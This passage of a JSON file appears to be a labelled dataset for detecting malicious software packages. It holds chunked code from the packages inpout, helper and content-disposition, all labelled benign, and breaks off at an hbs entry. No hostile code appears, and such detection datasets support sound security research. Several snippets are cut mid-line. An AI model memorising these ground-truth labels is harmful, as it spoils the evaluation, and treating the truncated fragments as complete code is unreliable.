{
  "timestamp": "2025-09-17 16:46:34.404137",
  "sample_count": 26,
  "samples": [
    {
      "package_name": "inpout",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.py (function)\ndef _read_file(filename):\n    with open(filename) as reader:\n        return reader.read()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (class)\nclass _WritableCompressor(Compressor):\n    def write(self, data): # pylint: disable=missing-docstring\n        return self.update(data)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (class)\nclass _ReadableDecompressor(Decompressor):\n    def readall(self):  # pylint: disable=missing-docstring\n        data_buffer = bytearray()\n        for chunk in self:\n            data_buffer += chunk\n        return bytes(data_buffer)\n\n    def read(self, n=-1):  # pylint: disable=missing-docstring, invalid-name, unused-argument\n        if n < 0:\n            return self.readall()\n        if n == 0:\n            return bytes()\n        iterator = iter(self)\n        data_buffer = bytearray(n)\n        bytes_read = 0\n        while bytes_read < n:\n            try:\n                chunk = next(iterator)\n                data_buffer[bytes_read:len(chunk)] = chunk\n                bytes_read += len(chunk)\n            except (Lz4FramedError, Lz4FramedNoDataError, StopIteration):\n                break\n        return bytes(data_buffer[0:bytes_read])\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (function)\ndef compressor(path, level=None, append=False):\n    \"\"\"Create a data compressing context manager for file writing.\n       When 'level' is None, a default LZ4F_COMPRESSION_MAX level is used.\n       When 'append' is True, the open mode is set for appending data.\"\"\"\n    level = LZ4F_COMPRESSION_MAX if level is None else level\n    with open(path, \"ab\" if append else \"wb\") as writer:\n        with _WritableCompressor(writer, level=level) as context:\n            yield context\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (function)\ndef decompressor(path):\n    \"\"\"Create a data decompressing context manager for file reading.\"\"\"\n    with open(path, \"rb\") as reader:\n        yield _ReadableDecompressor(reader)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (function)\ndef write(self, data): # pylint: disable=missing-docstring\n        return self.update(data)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (function)\ndef readall(self):  # pylint: disable=missing-docstring\n        data_buffer = bytearray()\n        for chunk in self:\n            data_buffer += chunk\n        return bytes(data_buffer)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py (function)\ndef read(self, n=-1):  # pylint: disable=missing-docstring, invalid-name, unused-argument\n        if n < 0:\n            return self.readall()\n        if n == 0:\n            return bytes()\n        iterator = iter(self)\n        data_buffer = bytearray(n)\n        bytes_read = 0\n        while bytes_read < n:\n            try:\n                chunk = next(iterator)\n                data_buffer[bytes_read:len(chunk)] = chunk\n                bytes_read += len(chunk)\n            except (Lz4FramedError, Lz4FramedNoDataError, StopIteration):\n                break\n        return bytes(data_buffer[0:bytes_read])\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/__init__.py (file)\n# Simple input/output using MessagePack and LZ4 for Python\n# Copyright 2019 Hugo Hromic\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Simple input/output using MessagePack and LZ4 package.\"\"\"\n\nfrom datetime import datetime\nfrom functools import partial\nfrom . import compression\nfrom . import packing\nfrom . import ext_types\nfrom .inpout import (\n    data_unpacker,\n    data_pack,\n    load_obj,\n    load_iter,\n    save_obj,\n    save_iter,\n)\n\n# register included extended type for Python 'set' objects\npacking.register_ext_type_encoder(set, partial(ext_types.encode_set, typecode=127))\npacking.register_ext_type_decoder(127, ext_types.decode_set)\n\n# register included extended type for Python 'datetime' objects\npacking.register_ext_type_encoder(datetime, partial(ext_types.encode_datetime, typecode=126))\npacking.register_ext_type_decoder(126, ext_types.decode_datetime)\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef data_unpacker(path, compression=True, **kwargs):\n    \"\"\"Create a data unpacker (MessagePack) context manager with\n       optional compression (LZ4) support.\"\"\"\n    with decompressor(path) if compression else open(path, \"rb\") as reader:\n        yield unpacker(reader, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef data_pack(path, compression=True, level=None, append=False, **kwargs):\n    \"\"\"Create a data pack (MessagePack) context manager with\n       optional compression (LZ4) support and file appending.\"\"\"\n    if compression:\n        context = compressor(path, level=level, append=append)\n    else:\n        context = open(path, \"ab\" if append else \"wb\")\n    with context as writer:\n        pkr = packer(**kwargs)\n        def _pack(obj):\n            writer.write(pkr.pack(obj))\n        yield _pack\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef load_obj(path, **kwargs):\n    \"\"\"Load an object from disk.\"\"\"\n    with data_unpacker(path, **kwargs) as _unpacker:\n        return next(_unpacker)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef load_iter(path, **kwargs):\n    \"\"\"Iterate objects from disk (MessagePack-LZ4 format).\"\"\"\n    with data_unpacker(path, **kwargs) as _unpacker:\n        for obj in _unpacker:\n            yield obj\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef save_obj(obj, path, **kwargs):\n    \"\"\"Save an object to disk (MessagePack-LZ4 format).\"\"\"\n    with data_pack(path, **kwargs) as _pack:\n        _pack(obj)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef save_iter(iterable, path, **kwargs):\n    \"\"\"Save an iterable to disk (MessagePack-LZ4 format).\"\"\"\n    with data_pack(path, **kwargs) as _pack:\n        for element in iterable:\n            _pack(element)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py (function)\ndef _pack(obj):\n            writer.write(pkr.pack(obj))\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/cli.py (function)\ndef pprint():\n    \"\"\"Pretty-print files in MsgPack format with optional compression.\"\"\"\n    parser = ArgumentParser(description=pprint.__doc__)\n    parser.add_argument(\"filenames\", metavar=\"FILENAME\", nargs=\"+\",\n                        help=\"an input filename to pretty-print\")\n    parser.add_argument(\"-n\", metavar=\"NUMBER\", type=int,\n                        help=\"only process the first NUMBER objects\"\n                             \" from each input file\")\n    args = parser.parse_args()\n\n    # read and pretty-print the given input files\n    pprinter = PrettyPrinter()\n    for fname in args.filenames:\n        sys.stderr.write(\"Processing file '%s' ...\\n\" % fname)\n        try:\n            compression = fname.lower().endswith(\".lz4\")\n            for cnt, obj in enumerate(load_iter(fname, compression=compression, use_list=False)):\n                if args.n is None or cnt < args.n:\n                    pprinter.pprint(obj)\n        except Exception as excp:  # pylint: disable=broad-except\n            sys.stderr.write(\"%s\\n\" % excp)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef _encode_ext_type(obj):\n    obj_type = type(obj)\n    if obj_type in _EXT_TYPE_ENCODERS:\n        return _EXT_TYPE_ENCODERS[obj_type](obj, packb=packb, ext_type=msgpack.ExtType)\n    raise TypeError(\"unknown extended type encoder for %r\" % obj_type)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef _decode_ext_type(typecode, data):\n    if typecode in _EXT_TYPE_DECODERS:\n        return _EXT_TYPE_DECODERS[typecode](data, unpackb=unpackb)\n    raise TypeError(\"unknown extended type decoder for typecode %d\" % typecode)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef register_ext_type_encoder(python_type, encoder):\n    \"\"\"Register a MessagePack ExtType encoder for a Python type.\"\"\"\n    _EXT_TYPE_ENCODERS[python_type] = encoder\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef register_ext_type_decoder(typecode, decoder):\n    \"\"\"Register a Python type decoder for a MessagePack ExtType typecode.\"\"\"\n    _EXT_TYPE_DECODERS[typecode] = decoder\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef pack(obj, stream, **kwargs):\n    \"\"\"Pack object using MessagePack (with extended types support)\n       and write packed bytes to a stream.\"\"\"\n    msgpack.pack(obj, stream, default=_encode_ext_type, use_bin_type=True, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef packb(obj, **kwargs):\n    \"\"\"Pack object using MessagePack (with extended types support)\n       and return packed bytes.\"\"\"\n    return msgpack.packb(obj, default=_encode_ext_type, use_bin_type=True, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef packer(*args, **kwargs):\n    \"\"\"Return a MessagePack (with extended types support) Packer object.\"\"\"\n    return msgpack.Packer(*args, default=_encode_ext_type, use_bin_type=True, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef unpack(stream, **kwargs):\n    \"\"\"Unpack a stream of packed bytes using MessagePack (with extended types support)\n       and return unpacked object.\"\"\"\n    return msgpack.unpack(stream, ext_hook=_decode_ext_type, raw=False, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef unpackb(packed, **kwargs):\n    \"\"\"Unpack packed bytes using MessagePack (with extended types support)\n       and return unpacked object.\"\"\"\n    return msgpack.unpackb(packed, ext_hook=_decode_ext_type, raw=False, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py (function)\ndef unpacker(*args, **kwargs):\n    \"\"\"Return a MessagePack (with extended types support) Unpacker object.\"\"\"\n    return msgpack.Unpacker(*args, ext_hook=_decode_ext_type, raw=False, **kwargs)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py (function)\ndef encode_set(obj, typecode, packb, ext_type):\n    \"\"\"Encode a Python 'set' object into a MessagePack ExtType.\"\"\"\n    return ext_type(typecode, packb(tuple(obj)))\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py (function)\ndef decode_set(data, unpackb):\n    \"\"\"Decode MessagePack data into a Python 'set' object.\"\"\"\n    return set(unpackb(data, use_list=False))\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py (function)\ndef encode_datetime(obj, typecode, packb, ext_type):\n    \"\"\"Encode a Python 'datetime' object into a MessagePack ExtType.\"\"\"\n    delta = obj - datetime(1970, 1, 1, tzinfo=obj.tzinfo)\n    data = delta.seconds + delta.days * 24 * 3600, delta.microseconds\n    return ext_type(typecode, packb(data))\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py (function)\ndef decode_datetime(data, unpackb):\n    \"\"\"Decode MessagePack data into a Python 'datetime' object.\"\"\"\n    seconds, microseconds = unpackb(data)\n    return datetime.utcfromtimestamp(seconds).replace(microsecond=microseconds)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.py (function)\ndef _read_file(filename):\n    with open(filename) as reader:\n        return reader.read()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.cfg (file)\n[bdist_wheel]\nuniversal = 1\n\n[egg_info]\ntag_build = \ntag_date = 0\n\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/__init__.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/cli.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.py",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.cfg"
      ],
      "individual_files": {
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.py": "def _read_file(filename):\n    with open(filename) as reader:\n        return reader.read()",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/compression.py": "def read(self, n=-1):  # pylint: disable=missing-docstring, invalid-name, unused-argument\n        if n < 0:\n            return self.readall()\n        if n == 0:\n            return bytes()\n        iterator = iter(self)\n        data_buffer = bytearray(n)\n        bytes_read = 0\n        while bytes_read < n:\n            try:\n                chunk = next(iterator)\n                data_buffer[bytes_read:len(chunk)] = chunk\n                bytes_read += len(chunk)\n            except (Lz4FramedError, Lz4FramedNoDataError, StopIteration):\n                break\n        return bytes(data_buffer[0:bytes_read])",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/__init__.py": "# Simple input/output using MessagePack and LZ4 for Python\n# Copyright 2019 Hugo Hromic\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Simple input/output using MessagePack and LZ4 package.\"\"\"\n\nfrom datetime import datetime\nfrom functools import partial\nfrom . import compression\nfrom . import packing\nfrom . import ext_types\nfrom .inpout import (\n    data_unpacker,\n    data_pack,\n    load_obj,\n    load_iter,\n    save_obj,\n    save_iter,\n)\n\n# register included extended type for Python 'set' objects\npacking.register_ext_type_encoder(set, partial(ext_types.encode_set, typecode=127))\npacking.register_ext_type_decoder(127, ext_types.decode_set)\n\n# register included extended type for Python 'datetime' objects\npacking.register_ext_type_encoder(datetime, partial(ext_types.encode_datetime, typecode=126))\npacking.register_ext_type_decoder(126, ext_types.decode_datetime)\n",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/inpout.py": "def _pack(obj):\n            writer.write(pkr.pack(obj))",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/cli.py": "def pprint():\n    \"\"\"Pretty-print files in MsgPack format with optional compression.\"\"\"\n    parser = ArgumentParser(description=pprint.__doc__)\n    parser.add_argument(\"filenames\", metavar=\"FILENAME\", nargs=\"+\",\n                        help=\"an input filename to pretty-print\")\n    parser.add_argument(\"-n\", metavar=\"NUMBER\", type=int,\n                        help=\"only process the first NUMBER objects\"\n                             \" from each input file\")\n    args = parser.parse_args()\n\n    # read and pretty-print the given input files\n    pprinter = PrettyPrinter()\n    for fname in args.filenames:\n        sys.stderr.write(\"Processing file '%s' ...\\n\" % fname)\n        try:\n            compression = fname.lower().endswith(\".lz4\")\n            for cnt, obj in enumerate(load_iter(fname, compression=compression, use_list=False)):\n                if args.n is None or cnt < args.n:\n                    pprinter.pprint(obj)\n        except Exception as excp:  # pylint: disable=broad-except\n            sys.stderr.write(\"%s\\n\" % excp)",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/packing.py": "def unpacker(*args, **kwargs):\n    \"\"\"Return a MessagePack (with extended types support) Unpacker object.\"\"\"\n    return msgpack.Unpacker(*args, ext_hook=_decode_ext_type, raw=False, **kwargs)",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/inpout/ext_types.py": "def decode_datetime(data, unpackb):\n    \"\"\"Decode MessagePack data into a Python 'datetime' object.\"\"\"\n    seconds, microseconds = unpackb(data)\n    return datetime.utcfromtimestamp(seconds).replace(microsecond=microseconds)",
        "data/benign_samples/pypi/longtail/inpout/1.0.8/inpout-1.0.8/setup.cfg": "[bdist_wheel]\nuniversal = 1\n\n[egg_info]\ntag_build = \ntag_date = 0\n\n"
      },
      "package_size_bytes": 14545,
      "num_files": 33,
      "metadata": {
        "package_hash": "pypi_inpout_1.0.8",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "helper",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/longtail/helper/0.0.13/package/index.js (function)\nvar copy = function(err) {\n    var is;\n    var os;\n\n    if (!err) {\n      return cb(new Error(\"File \" + dst + \" exists.\"));\n    }\n\n    fs.stat(src, function (err) {\n      if (err) {\n        return cb(err);\n      }\n      is = fs.createReadStream(src);\n      os = fs.createWriteStream(dst);\n      sys.pump(is, os, cb);\n    });\n  }\n\n  fs.stat(dst, copy);\n};\n\nexports.cpFileSync = function (src, dst) {\n  var data = fs.readFileSync(src, 'utf8');\n\n  if(!data) {\n    return false;\n  }\n\n  fs.writeFileSync(d\n==================================================\n\n# File: data/benign_samples/npm/longtail/helper/0.0.13/package/index.js (function)\nvar finish = function(err, data) {\n    var out = cjson.parse(data);\n\n    if(typeof encoding === 'function') {\n      encoding(err, out);\n    } else {\n      callback(err, out);\n    }\n  }\n\n  try {\n    fs.readFile(file, encoding, finish);\n  } catch(e) {\n    callback(e);\n  }\n}\n\nexports.jReadSync = function(file) {\n  try {\n    return cjson.parse(fs.readFileSync(file, 'utf8'));\n  } catch(e) {\n    return null;\n  }\n}\n\nexports.jWrite = function(file, data, encoding, callback) {\n  try {\n    fs.writeFileSyn\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/longtail/helper/0.0.13/package/index.js",
        "data/benign_samples/npm/longtail/helper/0.0.13/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/longtail/helper/0.0.13/package/index.js": "var finish = function(err, data) {\n    var out = cjson.parse(data);\n\n    if(typeof encoding === 'function') {\n      encoding(err, out);\n    } else {\n      callback(err, out);\n    }\n  }\n\n  try {\n    fs.readFile(file, encoding, finish);\n  } catch(e) {\n    callback(e);\n  }\n}\n\nexports.jReadSync = function(file) {\n  try {\n    return cjson.parse(fs.readFileSync(file, 'utf8'));\n  } catch(e) {\n    return null;\n  }\n}\n\nexports.jWrite = function(file, data, encoding, callback) {\n  try {\n    fs.writeFileSyn"
      },
      "package_size_bytes": 1272,
      "num_files": 2,
      "metadata": {
        "package_hash": "npm_helper_0.0.13",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "content-disposition",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction contentDisposition (filename, options) {\n  var opts = options || {}\n\n  // get type\n  var type = opts.type || 'attachment'\n\n  // get parameters\n  var params = createparams(filename, opts.fallback)\n\n  // format into string\n  return format(new ContentDisposition(type, params))\n}\n\n/**\n * Create parameters object from filename and fallback.\n *\n * @param {string} [filename]\n * @param {string|boolean} [fallback=true]\n * @return {object}\n * @private\n */\n\nfunction createparams (filename, fallbac\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction createparams (filename, fallback) {\n  if (filename === undefined) {\n    return\n  }\n\n  var params = {}\n\n  if (typeof filename !== 'string') {\n    throw new TypeError('filename must be a string')\n  }\n\n  // fallback defaults to true\n  if (fallback === undefined) {\n    fallback = true\n  }\n\n  if (typeof fallback !== 'string' && typeof fallback !== 'boolean') {\n    throw new TypeError('fallback must be a string or boolean')\n  }\n\n  if (typeof fallback === 'string' && NON_LATIN1_REGEXP.test(fal\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction format (obj) {\n  var parameters = obj.parameters\n  var type = obj.type\n\n  if (!type || typeof type !== 'string' || !TOKEN_REGEXP.test(type)) {\n    throw new TypeError('invalid type')\n  }\n\n  // start with normalized type\n  var string = String(type).toLowerCase()\n\n  // append parameters\n  if (parameters && typeof parameters === 'object') {\n    var param\n    var params = Object.keys(parameters).sort()\n\n    for (var i = 0; i < params.length; i++) {\n      param = params[i]\n\n      var val = p\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction decodefield (str) {\n  var match = EXT_VALUE_REGEXP.exec(str)\n\n  if (!match) {\n    throw new TypeError('invalid extended field value')\n  }\n\n  var charset = match[1].toLowerCase()\n  var encoded = match[2]\n  var value\n\n  // to binary string\n  var binary = encoded.replace(HEX_ESCAPE_REPLACE_REGEXP, pdecode)\n\n  switch (charset) {\n    case 'iso-8859-1':\n      value = getlatin1(binary)\n      break\n    case 'utf-8':\n      value = Buffer.from(binary, 'binary').toString('utf8')\n      break\n    de\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction getlatin1 (val) {\n  // simple Unicode -> ISO-8859-1 transformation\n  return String(val).replace(NON_LATIN1_REGEXP, '?')\n}\n\n/**\n * Parse Content-Disposition header string.\n *\n * @param {string} string\n * @return {object}\n * @public\n */\n\nfunction parse (string) {\n  if (!string || typeof string !== 'string') {\n    throw new TypeError('argument string is required')\n  }\n\n  var match = DISPOSITION_TYPE_REGEXP.exec(string)\n\n  if (!match) {\n    throw new TypeError('invalid type format')\n  }\n\n  \n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction parse (string) {\n  if (!string || typeof string !== 'string') {\n    throw new TypeError('argument string is required')\n  }\n\n  var match = DISPOSITION_TYPE_REGEXP.exec(string)\n\n  if (!match) {\n    throw new TypeError('invalid type format')\n  }\n\n  // normalize type\n  var index = match[0].length\n  var type = match[1].toLowerCase()\n\n  var key\n  var names = []\n  var params = {}\n  var value\n\n  // calculate index to start at\n  index = PARAM_REGEXP.lastIndex = match[0].substr(-1) === ';'\n    ? \n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction pdecode (str, hex) {\n  return String.fromCharCode(parseInt(hex, 16))\n}\n\n/**\n * Percent encode a single character.\n *\n * @param {string} char\n * @return {string}\n * @private\n */\n\nfunction pencode (char) {\n  return '%' + String(char)\n    .charCodeAt(0)\n    .toString(16)\n    .toUpperCase()\n}\n\n/**\n * Quote a string for HTTP.\n *\n * @param {string} val\n * @return {string}\n * @private\n */\n\nfunction qstring (val) {\n  var str = String(val)\n\n  return '\"' + str.replace(QUOTE_REGEXP, '\\\\$1') + '\"'\n\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction pencode (char) {\n  return '%' + String(char)\n    .charCodeAt(0)\n    .toString(16)\n    .toUpperCase()\n}\n\n/**\n * Quote a string for HTTP.\n *\n * @param {string} val\n * @return {string}\n * @private\n */\n\nfunction qstring (val) {\n  var str = String(val)\n\n  return '\"' + str.replace(QUOTE_REGEXP, '\\\\$1') + '\"'\n}\n\n/**\n * Encode a Unicode string for HTTP (RFC 5987).\n *\n * @param {string} val\n * @return {string}\n * @private\n */\n\nfunction ustring (val) {\n  var str = String(val)\n\n  // percent encode\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction qstring (val) {\n  var str = String(val)\n\n  return '\"' + str.replace(QUOTE_REGEXP, '\\\\$1') + '\"'\n}\n\n/**\n * Encode a Unicode string for HTTP (RFC 5987).\n *\n * @param {string} val\n * @return {string}\n * @private\n */\n\nfunction ustring (val) {\n  var str = String(val)\n\n  // percent encode as UTF-8\n  var encoded = encodeURIComponent(str)\n    .replace(ENCODE_URL_ATTR_CHAR_REGEXP, pencode)\n\n  return 'UTF-8\\'\\'' + encoded\n}\n\n/**\n * Class for parsed Content-Disposition header for v8 optimization\n \n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction ustring (val) {\n  var str = String(val)\n\n  // percent encode as UTF-8\n  var encoded = encodeURIComponent(str)\n    .replace(ENCODE_URL_ATTR_CHAR_REGEXP, pencode)\n\n  return 'UTF-8\\'\\'' + encoded\n}\n\n/**\n * Class for parsed Content-Disposition header for v8 optimization\n *\n * @public\n * @param {string} type\n * @param {object} parameters\n * @constructor\n */\n\nfunction ContentDisposition (type, parameters) {\n  this.type = type\n  this.parameters = parameters\n}\n\n==================================================\n\n# File: data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js (function)\nfunction ContentDisposition (type, parameters) {\n  this.type = type\n  this.parameters = parameters\n}\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js",
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/content-disposition/0.5.4/package/index.js": "function ContentDisposition (type, parameters) {\n  this.type = type\n  this.parameters = parameters\n}\n"
      },
      "package_size_bytes": 6684,
      "num_files": 11,
      "metadata": {
        "package_hash": "npm_content-disposition_0.5.4",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "hbs",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
